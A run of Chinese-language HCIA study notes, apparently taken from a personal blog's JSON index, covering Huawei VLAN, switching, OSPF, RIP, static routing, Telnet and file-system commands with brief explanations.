带标签后，终端是无法识别的，终端设备发的时候不带标签，收的时候也不带标签。交换机收的时候不带标签，发的时候也不带标签，交换机内部带标签。如果交换机收到数据帧是带标签的，保留。 sys int g0/0/0 //进入接口 port link-type ? //更改接口类型 int g0/0/2 //进入接口 p l a //缩写命令 //更改PVID port default vlan 2 //更改PVID的接口为2 port trunk allow-pass vlan 10 to 20 //允许trunk 10 到20 接口通过 类型 备注 Trunk干道端口 用于连接交换机或路由器，收到帧时，如果该帧不包含Tag，将打上端口的PVID；如果该帧包含Tag，则不改变。发送帧时，该帧的VLAN ID在Trunk的允许发送列表中：若与端口的PVID相同时，则剥离Tag发送若与端口的PVID不同时，则直接发送Trunk为1则代表允许VLAN1的流量通过如果没有Trunk，则代表只能多接好几根线，一根线一个VLAN 类型 备注 Hybrid 既可以连接主机，又可以连接其他交换机既可以充当Access角色，又可以充当Trunk角色既可以连接接入链路又可以连接干道链路允许多个VLAN的帧通过，并可以在出接口方向将某些VLAN帧的Tag剥掉（由命令决定） VLAN转发流程 VLAN规划基于端口最为常见 VLAN配置 命令 备注 vlan 10 创建单个vlan vlan batch 10 to 20 创建多个vlan port link-type access/trunk/hybird 配置接口类型 port default vlan 10 配置Access关联VLAN/PVID port trunk allow-pass vlan 10 配置Trunk允许VLAN默认只允许VLAN1 port trunk pvid vlan 10 配置Trunk 的PVID port hybrid pvid vlan 10 配置Hybird的PVID display vlan 验证VLAN display port vlan 验证VLAN int g0/0/0 //进入相关接口 port link-type access // 配置接口Access类型 p l a // 配置接口Access类型的缩写 dis port vlan //验证port vlan类型缩写= dis por v port default vlan 3 //更改PVID p d v 3 //更改vlan的ID缩写 //配置Trunk int g0/0/0 p l t //配置接口Trunk类型的缩写 port trunk allow-pass vlan 3//配置trunk类型允许通过的vlan port trunk pvid vlan 3 //配置接口trunk类型pvid dis por v //验证VLAN //hybrid模式 port hybrid pvid vlan 3 //配置hybrid vlan ID 等同于 Access port hybrid untagged vlan 3 //剥离VLAN3的标签 port hybrid tagged vlan 3 //包含vlan3标签 注意： 在更改接口类型的时候，要注意如果配置了子命令，应该先删除子命令，再更改接口类型。 Trunk允许VLAN默认为1，思科的设备默认为所有。 创建VLANsys vlan 1 //创建VLAN1 --- vlan batch 10 20 30 to 40 //创建多个vlan 验证VLANdisplay vlan //验证VLAN 配置接口类型---------------------------------- // 配置access int g0/0/0 //进入相关接口 port link-type access //配置接口access dis port vlan //验证接口配置 port default vlan 3 //配置接口的pvid d th //验证配置结果 ----------------------------------- //配置Trunk int g0/0/2 //进入接口 p l t //配置接口类型为Trunk d th // 验证配置 di p v //验证接口配置 port trunk allow-pass v 3 //默认只允许vlan1通过，允许vlan3通过 d th //验证配置 di p v //验证接口配置 port trunk pvid vlan 3 //配置trunk的PVID ------------------------------------------ //配置hybrid //和配置trunk是一样的 int g0/0/3 //进入接口 p l h //配置接口类型为hybrid d th //验证当前配置 d p v //验证接口配置 port hybrid untagged vlan 3 //配置hybrid vlan3 剥离标签 p h unt vlan 3 //配置hybrid vlan3 剥离标签缩写 port hybrid untagged vlan 3 //配置hybrid vlan3 带标签 port hybrid pvid vlan 3 //配置hybrid的PVID p h pv v 3 //配置hybrid的pvid缩写 说明： 不带标签的数据，接口默认允许通过 VLAN间路由部署了vlan的传统交换机不能实现不同VLAN间的二层报文转发，因此必须引入路由技术来实现不同VLAN间的通信，VLAN路由可以通过二层交换机配合路由器来实现，也可以通过三层交换机来实现。 VLAN间通讯限制每个VLAN都是一个独立的广播域，不同的VLAN之间二层就已经隔离，因此属于不同VLAN的节点之间是无法直接互访的。 说明： 路由器不能识别标签，标签只能在交换机之间识别 VLAN间通讯方法（路由） 到路由器的帧不带标签即可 VLAN路由-单臂路由 单臂路由的配置 命令 备注 dot1q termination 关联子接口和VLAN arp Broadcast enable 开启子接口的arp广播功能 ------------------------------------------ //单臂路由的配置 int g0/0/0.1 //创建子接口 dot1q termination vid 10 //关联子接口VLAN ID IP address xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //配置IP地址 arp Broadcast enable //开启子接口的arp广播功能 网关放在那一层比较好？ 园区网放在汇聚层比较好 运营商可以放在接入层 VLAN路由-三层交换 为每个VLAN创建一个VLANIF接口作为网关 配置MLSint vlanif 10 //配置VLAN 接口 IP add xxx.xxx.xxx.xxx y //配置IP地址 //注意:VLAN接口的编号必须对应一个已创建的VLAN vlan ba 2 3 //创建VLAN 2 3 int g0/0/1 //进入接口界面 p l a //配置接口类型为access p d v 2 //配置pvid int g0/0/2 //进入接口界面 p l a //配置接口类型为access p d v 3 //配置pvid int vlanif 2 //创建三层vlanif接口 ip add xxx.xxx.xxx.xxx y // 配置IP地址 q int vlanif 3 //创建三层vlanif接口 ip add xxx.xxx.xxx.xxx y // 配置IP地址 q","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"VLAN","slug":"VLAN","permalink":"http://sakuramuxia.github.io/tags/VLAN/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记8","slug":"hcia08","date":"2021-04-11T08:44:00.000Z","updated":"2021-05-03T06:06:29.383Z","comments":true,"path":"post/1c81.html","link":"","permalink":"http://sakuramuxia.github.io/post/1c81.html","excerpt":"","text":"交换基础dis mac-ad //显示mac地址 dis mac-ad aging-time //查看衰老时间 dis ip routing-table //查看路由表 arp -d //清空arp缓存 交换机工作在数据链路层，对数据帧进行操作，在收到数据帧后，交换机会根据数据帧的头部信息对数据帧进行转发。 说明： RIP是封装在UDP上 网络分层设计通过使用分层网络设计原则和条理化设计方法，设计人员可以创建易于管理和易于支持的网络 园区网 交换机主要功能 小型交换网络 交换机工作在数据链路层，转发数据帧； 纯二层交换机只要要求在同一个网段即可互通，只要保证这些设备在同一个广播域； 纯二层交换机不看IP地址，只看MAC地址； 交换机的工作原理根据MAC地址表中的MAC地址记录，做出智能转发 原理 备注 学习Learn 当从一个接口收到帧时，把帧内的源MAC与该接口进行绑定，存入MAC地址表 泛洪Flood 当从一个接口收到广播帧，组播帧，未知单播帧（目标MAC不存在于MAC地址表中）把该帧从所有其他接口转发出去，除了接收口 转发Forward 当从一个接口收到已知单播帧，立即从相应的接口转发出去 更新Update 默认每条记录保存300秒；交换机重启后清空所有接口学习到的记录；接口关闭后会清空该接口学习到的记录；一个源MAC出现在另外个接口上，会删除老的记录，添加新的记录 PS 对于一台交换机来说：一个MAC只能关联在一个接口上；一个接口上可以学习到多个MAC； 说明：目标MAC全F则代表广播帧； 学习MAC地址 交换机将收到的数据帧的源MAC地址和对应接口记录到MAC地址表中。 转发数据帧 当数据帧的目的MAC地址不在MAC表中，或者目的MAC地址为广播地址时，交换机会泛洪该帧。 目标主机回复 交换机根据MAC地址表将目标主机的回复信息单播转发给源主机 以太网接口工作模式 术语 备注 半双工 half-duplex通讯双方都能发送和接收数据，但不能同时进行 全双工 full-duplex通信双方都能同时接收和发送数据 速率 speed接口连接时两端进行协商，协商失败则无法正常通信 //验证网口的参数 dis interface g0/0/0 //查看接口的信息 dis mac-address //查看mac地址信息 //双工模式 //半双工：你发送的时候不能收，你收的时候不能发。 //全双工：发送的同时也可以发送。 基本配置undo negotiation auto //关闭自动协商 speed 100 //设置速率 duplex full //全双工 int g0/0/2 //进入接口 speed ? //设置速率 duplex ? //设置全半双工 验证命令dis interface g0/0/0 //查看接口信息 //如果网络出现卡顿或者其他问题可以查看交换机接口的错误信息； dis mac-address summary //查看交换机存储的mac地址总数；","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"交换","slug":"交换","permalink":"http://sakuramuxia.github.io/tags/%E4%BA%A4%E6%8D%A2/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记7","slug":"hcia07","date":"2021-04-09T10:50:30.000Z","updated":"2021-06-10T02:34:57.534Z","comments":true,"path":"post/d801.html","link":"","permalink":"http://sakuramuxia.github.io/post/d801.html","excerpt":"","text":"获取中... OSPF配置 命令 备注 ospf 1 router-id 1.1.1.1 开启ospf，进程号缺省为1，手动配置Route ID area0/0.0.0.0 配置区域 network 192.168.0.0 0.0.0.255 宣告网络，即指定运行ospf的接口；使用反掩码来匹配（255.255.255.255-掩码） display ospf peer [brief] 显示ospf邻居信息 ospf timer hello 10 修改Hello包发送间隔 ospf timer dead 40 修改Hello包超时时间（默认是4倍关系） display ospf interface g0/0/0 显示ospf接口信息 ospf dr-priority 100 修改ospf接口优先级（在接口下面） ospf Cost 10 修改开销，范围1~65535，缺省为1 bandwidth-reference 100 调整带宽参考值，默认为100Mbps，需要在整个ospf网络中统一进行调整 reset ospf process 重启OSPF进程 说明： 反掩码是根据前边添加的IP地址掩码对应匹配的网络地址或者IP地址 命令的执行在哪个界面使用，看命令的起手,例如ospf …是在接口的界面下更改的，前面没有ospf，是在进程的界面下更改的。 //做完每一步进行验证 dis ospf peer b // 查看是否已经建立好了邻居 //串口的速度为2.048 缺省路由的发布缺省路由：能匹配所有网络，配置方法有以下两种： 方式 备注 静态配置 使用命令：ip route-static 0.0.0.0 0.0.0.0 动态发布 使用动态路由协议进行发布 OSPF缺省路由发布命令ip route-static 0.0.0.0 0 xxx.xxx.xxx.xxx default-route-advertise //缺省路由发布命令 类似于引入的方式 acl 2000 // 建立一个规则 rule 1 permit //permit 允许 nat outbound 2000 // 路由认证 OSFP认证命令： 命令 备注 int g0/0/0 ospf authentication-mode md5 1cipher wakin 配置接口认证 ospf 1 area 0 authentication-mode md5 1 cipher wakin 配置区域认证 PS：如果同时配置，接口认证优先生效 ping -a xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //从xxxping到yyy tracert -a xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //跟踪从xxx到yyy","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"OSPF","slug":"OSPF","permalink":"http://sakuramuxia.github.io/tags/OSPF/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记6","slug":"hcia06","date":"2021-04-08T05:50:30.000Z","updated":"2021-05-03T06:05:39.443Z","comments":true,"path":"post/d800.html","link":"","permalink":"http://sakuramuxia.github.io/post/d800.html","excerpt":"","text":"OSPF区域概述 术语 备注 区域（Area） 为了适应大型的网络，OSPF在AS内划分多个区域，区域是以==接口为单位==来划分的，==每个OSPF路由器只维护所在区域的完整链路状态信息== 区域ID（Area ID） 可以表示成一个十进制的数字，如1，也可以表示成一个IP，如0.0.0.1 区域优点 尽量减少路由表条目，使拓扑变化仅影响本区域内部 ospf 1 // 创建进程 area x// 2的32次方 区域的类型 类型 备注 骨干区域 Area0，核心区域也叫==传输区域==（负责在不同的非骨干区域之间分发路由信息） 非骨干区域 非Area 0 也称为常规区域 PS ==所有其他非骨干区域必须和骨干区域直接相连== 类型 备注 IR Internal Route，内部路由器，所有的接口都属于同一区域 BR Backbone Router，骨干路由器，至少有一个接口属于骨干区域 ABR Area Border Router，区域边界路由器，连接一个或者多个区域到骨干区域，至少有一个接口属于骨干区域 ASBR Autonomous System Border Router 自治系统边界路由器 把从其他路由器协议学习到的路由以引入的方式到OSPF进程中 PS 一台路由器可以同时属于多种类型 OSPF核心工作流程： 发现并建立邻居； 传播LSA（区别于距离矢量的路由表更新） ​ Link State Advertisement,链路状态宣告（路况信息） ​ 链路：路由器接口 ​ 状态：描述接口信息（地址、掩码、开销、网络类型、邻居关系等） 将LSA泛洪到区域的所有OSPF路由器，而不是直连的路由器 收集LSA创建LSDB（链路状态数据库、地图） 使用SPF算法计算到每个目标网络的最短距离，并将其置于路由表中 dis ospf peer // 查看ospf邻居 dis ospf lsdb // 查看数据库 dis ospf bri //查看OSPF信息 dis ip routing-table//查看路由表 dis ip routing-table protocol ospf //过滤ospf路由协议 //配置ospf ospf x//创建进程 area x//创建区域 network xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //宣告路由 发现邻居 泛洪LSAs 建立数据库 说明：LSDB是一种数据库 SPF算法 生成路由 OSPF三张表 Route ID 运行OSPF协议前，必须选取一个RID； 用来唯一标识一台OSPF路由器； RID可以手动配置，也可以自动生成； 规则 备注 RID选取顺序规则 1 手动配置（推荐） 2 活动回环接口IP地址最高的 3 活动物理接口上选取IP地址最高的 PS RID选举具有非抢占性，，除非重启OSPF进程 自动配置route id时，ID的选取先看回环口，再看物理口； 配置Route IDospf x route-id xxx.xxx.xxx.xxx //配置RouteID reset ospf process //重启OSPF进程 OSPF数据包结构和类型封装于IP协议之上，IP协议号89 协议号：1代表ICMP；6代表TCP；17代表UDP； OSPF数据包类型（5种） OSPF数据包类型 作用 Hello 建立并维护邻居关系 Datebase Description LSDB的摘要（仅包含LSA包头） Link State Request（LSR） 请求LSA Link State Update（LSU） 发送LSA Link State Acknowledge（LSAck） 对LSU的确认 DB包用于对比路由器间的数据库 OSPF状态机制（7种状态） 状态 备注 失效状态（Down） 没有收到Hello包 初始状态（init） 收到Hello包，但没有看到自己 双向通讯状态（two-way） 收到Hello包，且看到了自己，形成邻居关系 交换初始状态（Exstart） 决定信息交换时路由器的主从关系 交换状态（Exchange） 向邻居发送DD数据包 加载状态（Loading） LSR和LSU交换 完全邻接状态（Full） LSDB同步，形成邻接关系 PS 只有Two-Way和Full是稳定状态 OSPF工作流程（数据包和状态切换过程） OSPF第一阶段是使用Hello包建立双向通信的过程，成为邻居关系。 OSPF第二阶段是通过交换LSDB同步，建立邻接关系 在同一个区域中，路由表可能不一样，邻居表可能不一样，但是数据库是一样的。 OSPF邻居建立条件必须三层直连 Hello报文用来发现和维护OSPF邻居关系 RID唯一 Hello/Dead时间间隔一致 区域ID一致 认证（如果启用了认证）一致 链路MTU大小一致（默认不开启检查，思科默认开启） 子网掩码一致（以太网环境） 网络地址一致 末梢区域设置一致 当出现邻居建立问题时需要从这几方面入手排查 配置OSPFHello时间ospf timer hello x //配置ospf hello时间 //默认Dead时间为hello时间的4倍 OSPF网络类型：基于接口 缺省情况下，OSPF认为以太网的网络类型是广播类型，PPP、HDLC的网络类型是点到点类型 缺省情况下，OSPF认为帧中继（FR），ATM（异步传输）的网络类型是NBMA，BMA广播多路，NBMA非广播多路。 这些接口也是多路访问，因为他是以太网接口，不是因为他有邻居才是多路访问。 改封装（串口）link-protocol ? // 封装类型为 fr hdlc lapb ppp sdlc x25 dis ospf int g0/0/0 // 网络类型验证 p2p 是点到点的类型 broadcast是广播类型 //点到点的是没有MAC地址的 DR和BDR只要是多路访问BMA和NBMA网络中，为了减少邻接关系的数量，从而减少数据包交换次数，最终节省带宽，降低对路由器处理能力的压力，选举DR和BDR。 术语 备注 DR Designed Route，指定路由器，类似班长，总经理 BDR Backup DR，备用DR，类似副班长，副总经理 DRothers 类似普通学生，普通员工 关系 DR、BDR、DRothers之间都保持邻接关系（Full）DRother之间保持邻居关系（Two-Way） 地址 224.0.0.6向DR和BDR发送链路状态更新，224.0.0.5向所有OSPF路由器发送 选举规则 首先比较Hello报文中携带的优先级，优先级范围0~225，默认=1，优先级最高的被选举为DR，优先级次高的被选举为BDR，优先级为0的不参与选举，优先级一致的情况下，比较RID，越发越优先，选举具有非抢占性，除非当DR和BDR都失效或重启OSPF进程 dis ospf int g0/0/0 //查看ospf协议对应接口的信息 dis ospf int lo 1 //查看ospf 回环口的接口信息 //更改回环口ospf的度量值 int lo 1 ospf cost x //输入更改的值即可 dis ospf peer b //查看邻居 //配置ospf sys sys R2 int g0/0/0 ip add xxx.xxx.xxx.xxx yy ospf 1 router-id zzz.zzz.zzz.zzz a j net xxx.xxx.xxx.xxx kkk.kkk.kkk.kkk DR，BDR是基于接口，一个路由器有好多接口， ospf度量值（开销） 在每一个运行OSPF的接口上，都维护着一个接口Cost Cost = 10^8/BW(bps) = 100Mbps/BW = 接口带宽参考值/接口带宽 到一个目标网络的度量值 = ​ 从源到目标所有出站接口的Cost值累加（数据方向） ​ 从源到本路由器沿途所有入站接口的Cost值累加（路有方向） 路由方向看入接口，数据方向看出接口","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"OSPF","slug":"OSPF","permalink":"http://sakuramuxia.github.io/tags/OSPF/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记5","slug":"hcia05","date":"2021-04-03T13:55:06.000Z","updated":"2021-06-10T02:33:14.255Z","comments":true,"path":"post/d940.html","link":"","permalink":"http://sakuramuxia.github.io/post/d940.html","excerpt":"","text":"RIP当网络发生故障时，RIP网络有可能产生路由环路； 配置RIP int lo x rip 1 //进程号 ，进程号之间互相独立 ver 2 //版本 net xxx.xxx.xxx.xxx // 宣告这个路由器的路由信息 net yyy.yyy.yyy.yyy // 等等 命令 备注 RIP 1 开启rip进程，进程缺省为1 version 2 开启RIPv2 network xxx.xxx.xxx.xxx 宣告网络，即指定运行RIP的接口，只需要输入接口的==主类网络地址==即可；只有处于此网络中的接口，才能进行RIP报文的接收和发送； rip metricin 5 在接收路由时增加度量值 rip metricout 5 在发送路由时修改度量值 rip split-horizon 开启水平分割，默认开启 rip poison-reverse 开启毒性反转，默认关闭 ==undo rip input== ==禁止接收RIP数据包== ==undo rip output== ==禁止发送rip数据包==//触发更新 ==silent-interface g0/0/0== ==配置被动接口，只收不发== display rip 验证rip信息 display rip int g0/0/0 verbose 验证rip接口相信信息 RIP配置-output int g0/0/0 //进入对应的接口 undo rip output //设置禁止发送rip报文 配置路由器的g0/0/0 接口禁止发送RIP报文 RIP配置-抑制接口 配置g0/0/0接口为抑制状态，只接受RIP报文，不发，被动接口； 此命令的优先级大于rip input 和rip output； 环路避免环路避免-水平分割 路由器从某个接口学到的路由，不会从该路由再发回给邻居路由器。 rip split-horizon // RIP水平分割 环路避免-触发更新 触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文； 环路避免-毒性反转 毒性反转是指路由器从某个接口学到路由后，将该接口的跳数设置为16，并从原接收口发回给邻居路由器； int g0/0/0 rip posion-reverse //开启毒性反转 默认关闭，打开后水平分割失效，毒性反转生效； 查看RIP详细信息dis rip 1 int g0/0/0 //查看rip对应接口信息 dis rip 1 int g0/0/0 verbose //查看rip对应接口详细信息 dis rip 1 // 查看rip1信息 RIP-调整度量值 int g0/0/0 // 进入相关的接口 rip metricout 2 // 在发送路由时修改度量值为2 说明：所有的改变都是为了选路 int g0/0/0 //进入相关的接口 rip metricin 2 // 在接收路由的时候增加度量值为2 1+2 到接收路由器时已经变为3 acl 2000 // acl的作用是 匹配路由 rule 1 permit so xxx.xxx.xxx.xxx 0 // 创建规则，允许x通过路由 filter-policy 2000 import g0/0/0 // 增加一个策略 2000 入方向 接口 OSPF动态路由开放式最短路径优先OSPF（Open Shortest Path First）协议是IETF定义的一种基于链路状态的内部网络路由协议。 RIP是一种基于距离矢量算法的路由协议，存在着收敛慢，易产生路由环路、可拓展性差等问题，目前已逐渐被OSPF取代。 OSPF概述：Open Shortest Path First 开放最短路径优先 大中型网络上使用最为广泛的IGP协议； 链路状态路由协议 无类 使用组播（224.0.0.5 和224.0.0.6） 收敛较快 以开销（cost）作为度量值； 采用的SPF算法可以有效的避免环路； 触发式更新（以较低的频率（每30分钟）发送定期更新，被称为链路状态泛洪） 区域的设计使得OSPF能够支持更大规模的网络 通过LSA的形式发布路由 不支持自动汇总，支持手动汇总 LSA代表路况 汇总 把 4个同网段的IP汇总到一个 OSPF区域概述 术语 备注 区域（Area） 为了适应大型的网络，OSPF在AS内划分多个区域，区域是以==接口为单位==来划分的，==每个OSPF路由器只维护所在区域的完整链路状态信息== 区域ID（Area ID） 可以表示成一个十进制的数字，如1，也可以表示成一个IP，如0.0.0.1 区域优点 ==尽量减少路由表条目，使拓扑变化仅影响本区域内部== ospf 1 // 创建进程 area x// 2的32次方 区域的类型 类型 备注 骨干区域 Area0，核心区域也叫==传输区域==（负责在不同的非骨干区域之间分发路由信息） 非骨干区域 非Area 0 也称为常规区域 PS ==所有其他非骨干区域必须和骨干区域直接相连== 类型 备注 IR Internal Route，内部路由器，==所有的接口都属于同一区域== BR Backbone Router，骨干路由器，至少有一个接口属于骨干区域 ABR Area Border Router，区域边界路由器，连接一个或者多个区域到骨干区域，至少有一个接口属于骨干区域 ASBR Autonomous System Border Router 自治系统边界路由器 把从其他路由器协议学习到的路由以引入的方式到OSPF进程中 PS 一台路由器可以同时属于多种类型","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"RIP","slug":"RIP","permalink":"http://sakuramuxia.github.io/tags/RIP/"}],"author":"湊あくあ"},{"title":"HCIA学习笔记4","slug":"hcia04","date":"2021-04-02T14:55:06.000Z","updated":"2021-05-03T05:59:06.881Z","comments":true,"path":"post/1981.html","link":"","permalink":"http://sakuramuxia.github.io/post/1981.html","excerpt":"","text":"路由备份-浮动静态路由 利用优先级的特性，配置浮动路由； 在主路由失效的情况下，浮动路由会加入到路由表并承担数据转发业务； 在主链路正常情况下，只有主路由会出现在路由表中； 配置验证dis ip routing-table //查看路由表 int g0/0/0 //进入对应接口模式 shutdown //关闭接口 d th // 查看当前配置 dis ip routing-table pro static //查看路由表详细信息 tracert 1.0.0.10 // 跟踪路由 // 写错的路由一定要删除 缺省路由一种特殊的路由，能匹配所有目标网络。 可以通过静态路由配置，也可以通过动态路由协议发布。 在路由表中，以到网络0.0.0.0（掩码为0.0.0.0）的形式出现、 通常用于末梢网络（如：家庭上网、企业出口） 命令 备注 ip route-static 0.0.0.0 0.0.0.0/0 下一跳地址/出接口 配置缺省路由 缺省路由配置 缺省路由是目标网络和掩码都为0的特殊路由； 如果报文的目标地址无法匹配路由表中的任何一项，路由器将选择依照缺省路由来转发报文 Loopback接口回环口，逻辑的、虚拟的接口； 命令 备注 interface loopback 编号 创建或配置一个回环口，创建后，默认up 作用 ==模拟直连网段==，可用于测试；设备管理（稳定）；供其他协议使用（ospf、bgp、mpls等）SNMP Traps消息的源地址；其他用途（用途十分广泛） int lo 2 // 进入回环口2 ip add xxx.xxx.xxx.xxx aa // 配置IP地址 dis ip routing-table // 查看路由表 dis ip int b // 查看接口 ip地址 //网关就是一条缺省路由 //本地网络不需要网关 //windows添加静态路由 rpute print route add xxx.xxx.xxx.xxx aa yyy.yyy.yyy.yyy ipconfig /release // 去除网卡(适配器1)的动态IP地址 ipconfig /renew //为网卡重新动态分配IP地址 ipconfig /all //显示所有网络适配器（网卡）TCP/IP配置 netsh winsock set //重置 Winsock 目录,重置网络编程接口 netsh winhttp reset proxy // 解除代理设置 netsh int ip reset c:/catalog.txt // 重置IP 设置，恢复到默认自动获取IP 和DNS 服务器地址。 nslookup 域名 //查询一台机器的IP地址和其对应的域名,通常它能监测网络中DNS服务器是否能正确实现域名解析它。 ping -a yyy.yyy.yyy.yyy xxx.xxx.xxx.xxx //y为源IP，x为目的IP 小工具：IPOP配置路由的工具； 动态路由路由协议概述： 路由器之间交互信息的一种语言； 共享路由信息； 维护路由表、提供最佳转发路径； 路由协议总览 动态路由的分类： show ip bgp sum //查看bgp的总和 CNNIC // 中国互联网信息中心 类型 备注 IGP（Interior Gateway Protocol）内部网关协议 用于一个AS内部交换路由信息RIP、OSPF、IS-IS EGP（Exterior Gateway Protocol）外部网关协议 用于多个AS之间交换路由信息BGP AS（Autonomous System）自制系统 处于单个管理机制下的网络（如：企业、电信、移动、联通） rip ? // 进程号 ospf ? // 进程号 isis ? // 进程号 //中国电信骨干网 AS 4134 bgp ? // AS号 路由协议分类：根据协议分类 类型 备注 DV（Distance-Vector）距离矢量 基于距离矢量算法，路由器并不了解网络拓扑结构类似路牌，道听途说如：RIP、EIGRP LS（Link-State）链路状态 基于SPF（Shortest Path First，最短路径优先）算法，路由器了解完整的网络拓扑结构，类似地图如OSPF、IS-IS RIP：只看眼前 LSA：链路状态宣告 OSPF：看带宽 有类：不携带掩码； 无类：携带掩码； 根据业务应用： 类型 备注 Unicast Routing Protocol 单播路由协议 如：RIP、EIGRP、OSPF、BGP、IS-IS Multicast Routing Protocol 组播路由协议 如：DVMRP、PIM-SM、PIM-DM 路由协议的操作规则 协议是在接口上运行的； 只能学习和发布相同协议已知的路由信息； 如果不同的路由协议间需要交换路由信息，就需要进行==注入（import）；== rip 1 //创建进程 // 宣告方式一 network xxx.xxx.xxx.xxx //宣告网络 // 注入方式二 //在RIP 1接口环境下注入 import route OSPF 1 // ver 1 RIP v1 版本 // ver 2 RIP v2 版本 路由器收敛 当所有路由表包含相同网络可达性信息 网络（路由）进入一个稳定状态 网络在达到收敛前无法完全正常工作 指标 备注 正确性 能够正确找到最优的路由，且无闭环 快收敛 当拓扑结构发生变化之后，能够迅速作出相应的路由改变 低开销 协议自身的开销（内存、CPU、网络带宽）最小 安全性 协议自身不易受攻击，有安全机制 普适性 适应各种拓扑结构和各种规模的网络 RIP路由信息协议（Routing Information Protocol）的简称，它是一种基于距离矢量（Distance Vector）算法的协议，使用跳数作为度量来衡量到达目的网络的距离。RIP主要应用于规模较小的网络中。 特点： 距离矢量路由协议，属于IGP协议； 适用于中小型网络，有RIPV1和RIPv2两个版本； 基于UDP，目标端口号520； 周期性更新约30s一次； 支持水平分割。毒性逆转和触发更新等防环特性； 工作原理： 路由器运行RIP后，会首先发送路由器更新请求，受到请求的路由器会发送自己的RIP路由进行响应。 网络稳定后，路由器会周期性发送路由更新信息。 RIP-度量 RIP使用跳数作为度量值来衡量到达目的网络的距离； 缺省情况下，直连网络的路由跳数为0，当路由器发送路由更新时，会把度量值加1； RIP规定超过15跳为网络不可达； 组播地址：224~239 RIP V1广播，V2组播 RIPv1和RIP v2的区别 RIPv1是有类路由协议，不支持VLSM和CIDR； 以广播的形式发送报文； 不支持认证； RIPv2是无类路由协议，支持VLSM支持路由聚合与CIDR； 支持以广播或者组播（224.0.0.9）方式发送报文； 支持明文认证和MD5密文认证； RIP环路当网络发生故障时，RIP网络有可能产生路由环路； 配置RIPrip 1 ver 2 net xxx.xxx.xxx.xxx // 宣告这个路由器的路由信息 net yyy.yyy.yyy.yyy // 等等","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"RIP","slug":"RIP","permalink":"http://sakuramuxia.github.io/tags/RIP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记3","slug":"hcia03","date":"2021-04-01T13:15:06.000Z","updated":"2021-05-03T05:57:09.082Z","comments":true,"path":"post/dbc0.html","link":"","permalink":"http://sakuramuxia.github.io/post/dbc0.html","excerpt":"","text":"// 强者把脆弱给自己看，弱者把脆弱给别人看 // 人心惟危，道心惟微 // 思往日身者，见未来远 // 三省 VRP远程管理Telnet应用场景Telnet可以通过终端对本地和远程的网络设备进行集中管理 允许终端远程登录到任何可以充当Telnet服务器的设备。 Telnet服务器和终端之间无需直连，只需保证两者之间可以互相通信即可。 Telnet直连服务 Telnet客户端和服务器基于TCP（端口号=23）连接来传输命令 认证模式 认证模式 描述 AAA 登录时需要用户名和密码 Password 登录时只需要密码 配置命令 命令 备注 Telnet server enable 开启Telnet服务 display telnet server status 验证Telnet服务 user-interface vty 0 4 进入VTy配置模式 authentication-mode password/aaa 配置认证模式 set authentication password cipher huawei 配置认证密码 user privilege level 15 配置用户级别 user-interface maximum-vty 15 配置最大VTY会话数量 aaa 进入AAA配置模式 local-user xxx password cipher xxx 创建用户和密码 local-user xxx privilege level 15 配置用户级别 local-user xxx service-type telnet 配置用户可用服务 dis tel ser st//简写 user-interface console 0//默认console口有一个admin账号aaa权限 dis current-configuration//查看当前配置 dis ip route //查看当前路由表 dis ip int b //? ==动手实践项目：实验拓扑== VRP文件系统华为网络设备的==配置文件==和==系统文件== 管理设备存储 管理项目 命令 管理项目 命令 管理项目 命令 修复文件系统异常的存储设备 fixdisk 创建目录 mkdir 显示文件的内容 more 格式化存储设备 format 重命名 rename 拷贝文件 copy 管理目录/文件 查看当前的工作目录 pwd 移动文件 move 管理项目 命令 改变当前目录 cd 重新命名文件 rename 恢复删除文件 undelete 显示文件或目录信息 dir 压缩文件 zip 删除目录 rmdir 删除文件 delete 执行批处理文件 execute 彻底删除回收站中的文件 reset d // 文件夹 r w x// x 可执行文件 reset recycle-bin // 清空回收站 delete unreserved xxx.xxx// 彻底删除文件 rename xxx.xxx yyy.yyy //重命名文件 copy xxx.xxx /yyy/zzz/aaa.aaa //把xxx 复制到yyy/zzz/目录并且把文件名改成aaa.aaa save // 保存配置 dis save-configuration file 